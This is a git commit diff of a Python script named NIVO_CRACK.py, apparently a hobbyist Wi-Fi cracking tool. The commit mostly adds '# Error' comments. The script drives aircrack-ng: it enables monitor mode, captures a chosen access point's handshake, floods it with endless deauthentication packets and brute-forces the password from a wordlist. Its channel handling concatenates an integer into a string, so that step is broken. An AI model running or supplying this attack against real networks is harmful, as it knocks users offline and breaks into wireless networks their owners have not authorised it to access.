03b0ff199d5ec2e8e22fa5427646506b0c03fde0
NIVOS Developer <88781785+TheSadError@users.noreply.github.com>
2022-04-25 16:34:03 +0400

    Update NIVO_CRACK.py

--- nivo/NIVO_CRACK.py
+++ nivo/NIVO_CRACK.py
@@ -1,50 +1,55 @@
+################################################################
+#           This Repo Writed By Error                          #
+################################################################
 import scapy.all as scapy
-import re
+import re # Error
 from threading import Thread
-import time
-import os
+import time # Error
+import os # Error
 from colorama import Fore,Back,Style
-
+# Error
 class bcolors:
     OK = '\033[92m' 
     WARNING = '\033[93m' 
     FAIL = '\033[91m' 
     RESET = '\033[0m' 
-
-
+# Error
+# Error
 print(f"{bcolors.OK}[NIVOS] Starting...")
 print(f"{bcolors.OK}[NIVOS] NIVO_CRACK Starting...")
-time.sleep(1)
+time.sleep(1) # Error
 os.system("sudo airmon-ng check kill")
 print(f"{bcolors.FAIL}[1] wlan0mon")
 print(f"{bcolors.FAIL}[2] wlan1mon")
 n = int(input(f"{bcolors.OK}[MENU] Please Select Interface : "))
-iw = "wlan1"
-if n == 1:
-    iw="wlan0"
-elif n == 2:
-    iw="wlan1"
-else:
+iw = "wlan1"# Error
+if n == 1:# Error
+    iw="wlan0"# Error
+elif n == 2:# Error
+    iw="wlan1"# Error
+else:# Error
     print(f"{bcolors.WARNING}[WARNING] Invalid Command Dedected. Please Input Valid Commands.")
-print(" ")
+print(" ")# Error
 print(f"{bcolors.OK}[NIVOS] Selected Interface : "+iw)
-print(" ")
+print(" ")# Error
 print(f"{bcolors.OK}[NIVOS] Mac Adress For Cracking...")
 os.system("sudo airmon-ng start "+iw)
 os.system("sudo airodump-ng "+iw+"mon")
 n = input(f"{bcolors.FAIL}[NIVOS] Input Output File Name : ")
 mac = input(f"{bcolors.FAIL}[NIVOS] Input MAC Adress : ")
 c = int(input(f"{bcolors.FAIL}[NIVOS] Input Channel Name : "))
+# Error
 print(f"{bcolors.FAIL}[NIVOS] Dedected Informations...")
 print(f"{bcolors.FAIL}[NIVOS] Cracking Starting...")
 print(" ")
+# Error
 os.system("sudo airodump-ng -c "+c+" -w "+n+" --bssid "+mac+" "+iw+"mon")
 print(f"{bcolors.FAIL}[NIVOS] Attacking Acces Point...")
 os.system("sudo aireplay-ng -0 0 -a "+mac+" "+iw+"mon")
 print(f"{bcolors.FAIL}[NIVOS] Brute Forcing To Mac Adress...")
 os.system("sudo aircrack-ng -w "+"./wordlists/simple.txt"+" "+n+".cap")
-
-
+# Error
+# Error
 
 #Other Ways To Hack Wifi Via Aircrack-Ng
 
